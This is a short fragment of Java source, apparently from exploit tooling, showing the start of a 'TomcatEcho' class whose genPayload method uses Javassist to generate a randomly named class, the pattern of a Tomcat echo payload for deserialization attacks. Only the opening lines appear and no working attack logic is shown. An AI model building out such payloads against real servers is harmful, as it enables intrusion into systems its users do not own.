...
public class TomcatEcho {
    public CtClass genPayload(final ClassPool pool) throws CannotCompileException, NotFoundException {
        final CtClass clazz = pool.makeClass("com.y5neko.Security" + System.nanoTime());
